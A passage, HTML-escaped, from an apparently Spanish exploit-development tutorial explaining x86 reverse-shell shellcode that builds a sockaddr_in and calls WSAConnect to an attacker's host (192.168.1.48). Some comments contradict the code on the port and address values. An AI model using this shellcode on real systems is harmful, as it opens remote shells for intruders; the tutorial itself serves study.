&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-modifier z-c++&quot;&gt;const&lt;&#x2F;span&gt; sockaddr &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;name&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;namelen&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPWSABUF &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpCallerData&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPWSABUF &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpCalleeData&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPQOS &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpSQOS&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPQOS lpGQOS
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c++&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Después del parámetro &lt;code&gt;*name&lt;&#x2F;code&gt; , que apunta a la estructura &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt; , necesitamos proporcionar el tamaño de la estructura pasada previamente como parámetro namelen . Podemos calcular el tamaño de &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt;, que tiene una longitud de &lt;code&gt;0x10&lt;&#x2F;code&gt; bytes, utilizando los tipos de datos de la definición de la estructura.&lt;&#x2F;p&gt;
&lt;p&gt;Los dos siguientes parámetros, &lt;code&gt;lpCallerData&lt;&#x2F;code&gt; y &lt;code&gt;lpCalleeData&lt;&#x2F;code&gt;, requieren punteros a los datos del usuario que se transferirán hacia y desde el otro socket. Según la documentación, estos parámetros son utilizados por protocolos heredados y no son compatibles con TCP&#x2F;IP. &lt;strong&gt;Podemos configurarlos como nulo.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;El parámetro lpSQOS requiere un puntero a la estructura FLOWSPEC. Esta estructura se utiliza en aplicaciones que admiten parámetros de calidad de servicio (QoS) . Este no es el caso de nuestro shellcode, por lo que podemos establecerlo en NULL. Por último, el parámetro lpGQOS está reservado y debe establecerse en nulo.&lt;&#x2F;p&gt;
&lt;p&gt;Antes de actualizar nuestro shellcode, debemos poner nuestra dirección IP en el formato correcto.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0n192
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 192 = 000000c0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0n168
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 168 = 000000a8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0n1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 1 = 00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0n48
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 48 = 00000030
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; ? 0n4444
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Evaluate expression: 4444 = 0000115c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Ahora que tenemos los valores hexadecimales, podemos seguir con la implementación de la función &lt;code&gt;call_wsaconnect:&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call_wsaconnect:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve el descriptor del SOCKET a ESI
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta sin_zero[]
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta sin_zero[]
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x3001a8c0;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;               &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta sin_addr (192.168.1.48) - 0x301a8c0
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ax, 0xbb01;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Mueve el valor sin_port (443) a AX - 0x115c
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;shl eax, 0x10;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                 &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Desplazar EAX 0x10 bytes a la izquierda
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add ax, 0x02;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Añade 0x02 (AF_INET) a AX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta sin_port &amp;amp; sin_family
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push esp;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta el puntero de la estructura the sockaddr_in
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;pop edi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guarda el puntero a sockaddr_in en EDI
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpGQOS
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpSQOS
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpCalleeData
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpCallerData
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;add al, 0x10;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Pone AL con un valor de 0x10 (namelen)
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta namelen
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push edi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta *name
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta s
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x28];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llama a WSAConnect
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La función call_wsaconnect comienza guardando el descriptor de socket (obtenido en el paso anterior) en ESI. Esto solo funcionará si nuestras instrucciones no alteran ESI antes de llamar a WSAConnect.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, anulamos el registro EAX y lo insertamos dos veces en la pila. Estas dos instrucciones PUSH configuran la matriz de caracteres &lt;code&gt;sin_zero&lt;&#x2F;code&gt; desde la estructura &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Luego procedemos a ingresar un dword que representa el valor hexadecimal de nuestra dirección IP. Tendremos que insertarlo en orden inverso debido al orden de bytes endian. Esto también aplica a nuestra siguiente instrucción, que mueve una palabra (WORD) al registro AX que contiene la representación hexadecimal del puerto deseado (443).&lt;&#x2F;p&gt;
&lt;p&gt;Usando la instrucción &lt;code&gt;shl&lt;&#x2F;code&gt; , desplazaremos a la izquierda el valor EAX en &lt;code&gt;0x10&lt;&#x2F;code&gt; bytes y luego añadiremos &lt;code&gt;0x02&lt;&#x2F;code&gt; al registro AX. Esto se debe a que los miembros &lt;code&gt;sin_port&lt;&#x2F;code&gt; y &lt;code&gt;sin_family&lt;&#x2F;code&gt; están definidos como USHORT, lo que significa que cada uno tiene dos bytes de longitud.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, insertaremos el dword resultante en la pila, completando así la estructura &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt; . A continuación, obtendremos un puntero a este mediante las instrucciones &lt;code&gt;push esp&lt;&#x2F;code&gt; y &lt;code&gt;pop edi&lt;&#x2F;code&gt; para usarlo posteriormente.&lt;&#x2F;p&gt;
&lt;p&gt;La siguiente instrucción anula el registro EAX y lo insertamos en la pila cuatro veces. Esto configura los argumentos nulos para nuestra llamada a la función.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, añadimos &lt;code&gt;0x10&lt;&#x2F;code&gt; al registro AL y lo insertamos en la pila como nuestro argumento &lt;code&gt;namelen&lt;&#x2F;code&gt; . Finalmente, insertamos el puntero a la estructura &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt; , almacenada en EDI, y al descriptor de socket de ESI.&lt;&#x2F;p&gt;
&lt;p&gt;Una vez insertados todos los argumentos procedemos a llamar a &lt;code&gt;WSAConnect&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 1 hit
